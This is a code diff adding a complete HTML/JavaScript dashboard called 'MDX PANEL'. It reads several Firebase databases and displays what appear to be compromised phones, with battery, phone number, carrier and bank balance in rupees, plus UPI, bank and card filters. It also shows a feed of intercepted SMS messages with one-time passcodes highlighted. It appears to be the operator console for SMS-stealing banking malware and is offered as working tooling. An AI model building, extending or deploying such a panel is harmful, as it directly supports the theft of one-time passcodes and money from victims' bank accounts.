@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>MDX PANEL — Multi Firebase</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',sans-serif; }
+        body { background:#0b0e14; color:#e0e0e0; display:flex; justify-content:center; padding:16px; }
+        .container { max-width:1200px; width:100%; }
+
+        /* HEADER */
+        .header { display:flex; justify-content:space-between; align-items:center; padding:12px 0; border-bottom:1px solid #1f2a34; flex-wrap:wrap; }
+        .logo { color:#00ff88; font-weight:700; font-size:26px; letter-spacing:1px; }
+        .logo span { color:#fff; font-weight:300; }
+        .header-right { display:flex; align-items:center; gap:14px; font-size:14px; color:#aaa; flex-wrap:wrap; }
+        .header-right .time { color:#888; }
+        .btn { background:#1e2630; border:none; color:#ccc; padding:6px 16px; border-radius:6px; cursor:pointer; }
+        .btn-green { background:#00ff88; color:#000; font-weight:600; }
+        .btn-red { background:#ff3333; color:#fff; }
+
+        /* CONFIG PANEL */
+        .config-panel { background:#131a22; border-radius:14px; border:1px solid #1f2a34; padding:18px; margin:14px 0; }
+        .config-panel h3 { color:#00ff88; margin-bottom:8px; }
+        .config-row { display:flex; gap:10px; flex-wrap:wrap; align-items:center; }
+        .config-row input { flex:1; min-width:200px; padding:10px 14px; background:#0b0e14; border:1px solid #2a3a4a; color:#fff; border-radius:8px; }
+        .config-row input::placeholder { color:#555; }
+        .source-list { display:flex; flex-wrap:wrap; gap:8px; margin-top:12px; }
+        .source-tag { background:#0b0e14; padding:4px 14px; border-radius:20px; border:1px solid #00ff8844; font-size:13px; display:flex; align-items:center; gap:8px; }
+        .source-tag .remove { color:#ff5555; cursor:pointer; font-weight:bold; }
+        .source-tag .status-dot { display:inline-block; width:8px; height:8px; border-radius:50%; }
+        .dot-online { background:#00cc66; }
+        .dot-offline { background:#ff5555; }
+        .dot-unknown { background:#888; }
+
+        /* STATS */
+        .stats { display:grid; grid-template-columns:repeat(auto-fit, minmax(120px,1fr)); gap:12px; margin:14px 0; }
+        .stat-box { background:#131a22; padding:10px 14px; border-radius:10px; border-left:3px solid #00ff88; text-align:center; }
+        .stat-box span { color:#888; font-size:11px; text-transform:uppercase; }
+        .stat-box h3 { font-size:22px; }
+
+        /* SEARCH + FILTERS */
+        .search-bar { margin:10px 0; }
+        .search-bar input { width:100%; padding:10px 16px; background:#0b0e14; border:1px solid #1f2a34; border-radius:30px; color:#fff; font-size:14px; }
+        .filters { display:flex; gap:8px; flex-wrap:wrap; margin-bottom:14px; }
+        .filters button { background:#1e2630; border:none; color:#ccc; padding:6px 18px; border-radius:20px; cursor:pointer; font-size:13px; }
+        .filters button.active { background:#00ff88; color:#000; font-weight:600; }
+
+        /* DEVICE GRID */
+        .device-grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(240px,1fr)); gap:14px; margin-bottom:18px; }
+        .device-card { background:#131a22; padding:14px 16px; border-radius:14px; border:1px solid #1f2a34; }
+        .device-card:hover { border-color:#00ff8855; }
+        .device-id { font-size:13px; color:#aaa; word-break:break-all; }
+        .device-status { display:inline-block; font-size:11px; padding:2px 14px; border-radius:14px; margin:6px 0; font-weight:600; }
+        .status-online { background:#00cc66; color:#000; }
+        .status-offline { background:#444; color:#aaa; }
+        .device-detail { display:flex; justify-content:space-between; font-size:13px; margin:4px 0; }
+        .device-detail .label { color:#888; }
+        .battery { color:#ffaa33; }
+        .bank { color:#00ff88; }
+        .source-badge { font-size:10px; color:#666; background:#0b0e14; padding:1px 8px; border-radius:10px; display:inline-block; margin-top:4px; }
+
+        /* SMS */
+        .sms-section { background:#131a22; border-radius:14px; border:1px solid #1f2a34; padding:16px; margin-top:8px; }
+        .sms-section .head { display:flex; justify-content:space-between; color:#00ff88; font-weight:600; margin-bottom:10px; font-size:16px; }
+        .sms-section .head span { color:#666; font-weight:400; font-size:13px; }
+        .sms-item { background:#0b0e14; padding:10px 14px; border-radius:8px; margin-bottom:6px; border-left:3px solid #00ff8866; font-size:14px; word-break:break-word; }
+        .sms-item .time { color:#666; font-size:12px; float:right; }
+        .sms-item .otp { color:#ffaa33; font-weight:700; }
+        .no-data { color:#666; text-align:center; padding:30px; }
+
+        .hidden { display:none; }
+        .mt-8 { margin-top:8px; }
+    </style>
+</head>
+<body>
+<div class="container" id="app">
+
+    <!-- HEADER -->
+    <div class="header">
+        <div class="logo">MDX <span>PANEL</span></div>
+        <div class="header-right">
+            <span class="time" id="clock">--:--</span>
+            <span id="connStatus">● Connected</span>
+            <button class="btn" onclick="toggleConfig()">⚙️ Manage Sources</button>
+        </div>
+    </div>
+
+    <!-- CONFIG PANEL -->
+    <div id="configPanel" class="config-panel hidden">
+        <h3>🔗 Manage Firebase Sources</h3>
+        <div class="config-row">
+            <input type="text" id="newUrl" placeholder="Firebase Database URL (e.g. https://xxx.firebaseio.com)" />
+            <input type="text" id="newSecret" placeholder="Secret (optional)" style="flex:0.5;min-width:120px;" />
+            <button class="btn btn-green" onclick="addSource()">➕ Add</button>
+        </div>
+        <div class="source-list" id="sourceList"></div>
+        <div id="configStatus" style="color:#ffaa33;font-size:13px;margin-top:8px;"></div>
+    </div>
+
+    <!-- STATS -->
+    <div class="stats" id="statsContainer">
+        <div class="stat-box"><span>TOTAL</span><h3 id="totalCount">0</h3></div>
+        <div class="stat-box"><span>ONLINE</span><h3 id="onlineCount" style="color:#00cc66;">0</h3></div>
+        <div class="stat-box"><span>OFFLINE</span><h3 id="offlineCount" style="color:#ff6666;">0</h3></div>
+        <div class="stat-box"><span>BANK</span><h3 id="bankTotal" style="color:#00ff88;">₹0</h3></div>
+        <div class="stat-box"><span>SMSCARDS</span><h3 id="smsCount">0</h3></div>
+    </div>
+
+    <!-- SEARCH -->
+    <div class="search-bar">
+        <input type="text" id="searchInput" placeholder="Search devices..." oninput="applySearch()" />
+    </div>
+
+    <!-- FILTERS -->
+    <div class="filters" id="filterBar">
+        <button class="active" onclick="setFilter('all')">All</button>
+        <button onclick="setFilter('online')">Online</button>
+        <button onclick="setFilter('offline')">Offline</button>
+        <button onclick="setFilter('upi')">Upi</button>
+        <button onclick="setFilter('bank')">Bank</button>
+        <button onclick="setFilter('card')">Card</button>
+    </div>
+
+    <!-- DEVICES -->
+    <div class="device-grid" id="deviceGrid"><div class="no-data">Loading devices...</div></div>
+
+    <!-- SMS -->
+    <div class="sms-section">
+        <div class="head">📩 Last Messages <span>auto-refreshes</span></div>
+        <div id="smsList"><div class="no-data">No messages yet</div></div>
+    </div>
+</div>
+
+<script>
+    // ─── CONFIG ───
+    let sources = [];
+    let allDevices = [];
+    let allMessages = [];
+    let currentFilter = 'all';
+    let searchQuery = '';
+
+    // Load from localStorage
+    (function() {
+        const saved = localStorage.getItem('mdxSources');
+        if (saved) {
+            try {
+                sources = JSON.parse(saved);
+                renderSources();
+                if (sources.length) fetchAll();
+            } catch(e) {}
+        }
+    })();
+
+    // ─── SOURCE MANAGEMENT ───
+    window.toggleConfig = function() {
+        document.getElementById('configPanel').classList.toggle('hidden');
+    };
+
+    window.addSource = function() {
+        const url = document.getElementById('newUrl').value.trim();
+        const secret = document.getElementById('newSecret').value.trim();
+        if (!url) {
+            document.getElementById('configStatus').textContent = '❌ Please enter URL';
+            return;
+        }
+        // Avoid duplicates
+        if (sources.some(s => s.url === url)) {
+            document.getElementById('configStatus').textContent = '⚠️ URL already added';
+            return;
+        }
+        sources.push({ url, secret, label: url.replace(/^https?:\/\//, '').split('.')[0] || 'Unnamed' });
+        localStorage.setItem('mdxSources', JSON.stringify(sources));
+        document.getElementById('newUrl').value = '';
+        document.getElementById('newSecret').value = '';
+        document.getElementById('configStatus').textContent = '✅ Added! Fetching...';
+        renderSources();
+        fetchAll();
+    };
+
+    window.removeSource = function(index) {
+        sources.splice(index, 1);
+        localStorage.setItem('mdxSources', JSON.stringify(sources));
+        renderSources();
+        if (sources.length) fetchAll();
+        else { allDevices = []; allMessages = []; renderAll(); }
+    };
+
+    function renderSources() {
+        const container = document.getElementById('sourceList');
+        if (!sources.length) {
+            container.innerHTML = '<span style="color:#555;font-size:13px;">No sources added. Add a Firebase URL above.</span>';
+            return;
+        }
+        container.innerHTML = sources.map((s, i) => `
+            <span class="source-tag">
+                <span class="status-dot dot-unknown"></span>
+                ${s.label}
+                <span class="remove" onclick="removeSource(${i})">✕</span>
+            </span>
+        `).join('');
+    }
+
+    // ─── FETCH ALL SOURCES ───
+    async function fetchAll() {
+        document.getElementById('deviceGrid').innerHTML = '<div class="no-data">⏳ Fetching from ' + sources.length + ' sources...</div>';
+        let allDevs = [];
+        let allMsgs = [];
+        let totalBank = 0;
+
+        for (const src of sources) {
+            try {
+                const base = src.url.replace(/\/$/, '');
+                const auth = src.secret ? `?auth=${src.secret}` : '';
+                const res = await fetch(`${base}/.json${auth}`);
+                if (!res.ok) continue;
+                const root = await res.json();
+                if (!root) continue;
+
+                // Extract devices
+                let devs = [];
+                if (root.clients) {
+                    const val = root.clients;
+                    devs = Array.isArray(val) ? val : Object.values(val);
+                } else if (root.devices) {
+                    const val = root.devices;
+                    devs = Array.isArray(val) ? val : Object.values(val);
+                } else {
+                    for (const key of Object.keys(root)) {
+                        const val = root[key];
+                        if (Array.isArray(val) && val.length && typeof val[0] === 'object' && (val[0].battery || val[0].status)) {
+                            devs = val; break;
+                        } else if (typeof val === 'object' && val !== null) {
+                            const arr = Object.values(val);
+                            if (arr.length && typeof arr[0] === 'object' && (arr[0].battery || arr[0].status)) {
+                                devs = arr; break;
+                            }
+                        }
+                    }
+                }
+                // Add source label to each device
+                devs.forEach(d => d._source = src.label);
+
+                // Extract messages
+                let msgs = [];
+                if (root.messages) {
+                    const val = root.messages;
+                    msgs = Array.isArray(val) ? val : Object.values(val);
+                } else if (root.sms) {
+                    const val = root.sms;
+                    msgs = Array.isArray(val) ? val : Object.values(val);
+                }
+                msgs.forEach(m => m._source = src.label);
+
+                allDevs.push(...devs);
+                allMsgs.push(...msgs);
+
+            } catch (e) {
+                // skip failed source
+            }
+        }
+
+        allDevices = allDevs;
+        allMessages = allMsgs;
+        renderAll();
+    }
+
+    // ─── RENDER ───
+    function renderAll() {
+        renderStats();
+        renderDevices();
+        renderMessages();
+    }
+
+    function renderStats() {
+        const total = allDevices.length;
+        const online = allDevices.filter(d => d.status === true || d.status === 'online' || d.status === 'Online').length;
+        const offline = total - online;
+        let bankSum = 0;
+        allDevices.forEach(d => {
+            const b = parseFloat(d.bank || d.Bank || 0);
+            if (!isNaN(b)) bankSum += b;
+        });
+        document.getElementById('totalCount').textContent = total;
+        document.getElementById('onlineCount').textContent = online;
+        document.getElementById('offlineCount').textContent = offline;
+        document.getElementById('bankTotal').textContent = `₹${bankSum.toFixed(2)}`;
+        document.getElementById('smsCount').textContent = allMessages.length;
+    }
+
+    function renderDevices() {
+        const grid = document.getElementById('deviceGrid');
+        let list = allDevices;
+
+        // Filter
+        if (currentFilter === 'online') {
+            list = list.filter(d => d.status === true || d.status === 'online' || d.status === 'Online');
+        } else if (currentFilter === 'offline') {
+            list = list.filter(d => d.status !== true && d.status !== 'online' && d.status !== 'Online');
+        }
+
+        // Search
+        if (searchQuery.trim()) {
+            const q = searchQuery.toLowerCase();
+            list = list.filter(d => {
+                const id = (d.deviceId || d.id || '').toLowerCase();
+                const num = (d.number || d.phone || '').toString();
+                return id.includes(q) || num.includes(q);
+            });
+        }
+
+        if (!list.length) {
+            grid.innerHTML = '<div class="no-data">No devices found</div>';
+            return;
+        }
+
+        grid.innerHTML = list.map(d => {
+            const status = (d.status === true || d.status === 'online' || d.status === 'Online') ? 'online' : 'offline';
+            const statusClass = status === 'online' ? 'status-online' : 'status-offline';
+            const label = status === 'online' ? 'Online' : 'Offline';
+            const battery = d.battery || d.Battery || d.bat || '0';
+            const number = d.number || d.phone || '—';
+            const network = d.network || d.Network || d.carrier || '—';
+            const bank = parseFloat(d.bank || d.Bank || 0) || 0;
+            const deviceId = d.deviceId || d.id || 'N/A';
+            const source = d._source || 'unknown';
+            return `
+                <div class="device-card">
+                    <div class="device-id">${deviceId}</div>
+                    <div class="device-status ${statusClass}">${label}</div>
+                    <div class="device-detail"><span class="label">Battery</span><span class="battery">${battery}%</span></div>
+                    <div class="device-detail"><span class="label">Number</span><span>${number}</span></div>
+                    <div class="device-detail"><span class="label">Network</span><span>${network}</span></div>
+                    <div class="device-detail"><span class="label">Bank</span><span class="bank">₹${bank.toFixed(2)}</span></div>
+                    <span class="source-badge">📡 ${source}</span>
+                </div>
+            `;
+        }).join('');
+    }
+
+    function renderMessages() {
+        const container = document.getElementById('smsList');
+        if (!allMessages.length) {
+            container.innerHTML = '<div class="no-data">No messages yet</div>';
+            return;
+        }
+        const sorted = allMessages.sort((a,b) => (b.timestamp||b.id||0) - (a.timestamp||a.id||0)).slice(0,20);
+        container.innerHTML = sorted.map(m => {
+            const text = m.message || m.text || m.body || '';
+            const time = m.dateTime || m.time || m.date || '';
+            const otpMatch = text.match(/\b\d{4,8}\b/);
+            let display = text;
+            if (otpMatch) {
+                display = text.replace(otpMatch[0], `<span class="otp">${otpMatch[0]}</span>`);
+            }
+            const source = m._source || '';
+            return `<div class="sms-item"><span>${display}</span><span class="time">${time} ${source ? '📡'+source : ''}</span></div>`;
+        }).join('');
+    }
+
+    // ─── FILTERS & SEARCH ───
+    window.setFilter = function(filter) {
+        currentFilter = filter;
+        document.querySelectorAll('#filterBar button').forEach(b => b.classList.remove('active'));
+        document.querySelectorAll('#filterBar button').forEach(b => {
+            if (b.textContent.toLowerCase() === filter) b.classList.add('active');
+        });
+        renderDevices();
+    };
+
+    window.applySearch = function() {
+        searchQuery = document.getElementById('searchInput').value;
+        renderDevices();
+    };
+
+    // ─── CLOCK ───
+    function updateClock() {
+        const now = new Date();
+        document.getElementById('clock').textContent = now.toLocaleTimeString('en-IN', { hour:'2-digit', minute:'2-digit' });
+    }
+    setInterval(updateClock, 1000);
+    updateClock();
+
+    // ─── AUTO REFRESH ───
+    setInterval(() => {
+        if (sources.length) fetchAll();
+    }, 60000);
+
+    // ─── INIT ───
+    if (!sources.length) {
+        document.getElementById('configPanel').classList.remove('hidden');
+        document.getElementById('deviceGrid').innerHTML = '<div class="no-data">Add a Firebase URL above to get started.</div>';
+    }
+</script>
+</body>
+</html>
